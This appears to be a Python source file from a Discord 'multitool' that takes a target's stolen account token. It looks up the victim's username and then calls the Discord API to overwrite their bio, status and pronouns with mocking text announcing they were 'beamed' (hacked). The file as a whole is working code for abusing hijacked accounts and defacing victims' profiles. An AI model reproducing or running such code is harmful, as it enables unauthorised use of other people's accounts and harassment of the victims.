# Stellar Multitool is proudly coded by @swedewtf, @rinfys and @crxelty (no longer active)
# Multitool maintained/updated by @swedewtf and @rinfys


from colorama import Fore, Style, init
init(convert=True)
import requests
from util.plugins.pluh import *

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
white = Fore.WHITE

def stellarify():
    token = input("Enter targets token: ")
    tokencheck(token)
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    info = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
    user = info["username"] + "#" + str(info["discriminator"])
    status = "ANTI SKIDDING!! STELLAR MULTITOOL ON TOP"
    bio = "lol i got beamed and now im shitting my pants"
    pronouns = "stellar/fucks/skids"

    headers = {
        'Authorization': token
    }

    data = {
        'bio': {"text": bio},
        'custom_status': {"text": status},
        "pronouns": pronouns
    }

    requests.patch("https://discord.com/api/v10/users/@me/settings", json=data, headers=headers)
    slowprint(f"{green}Sucessfully stellar-ify-ed {user}'s profile!")
    input("Press anything to continue...\n")
    __import__("Stellar").main()
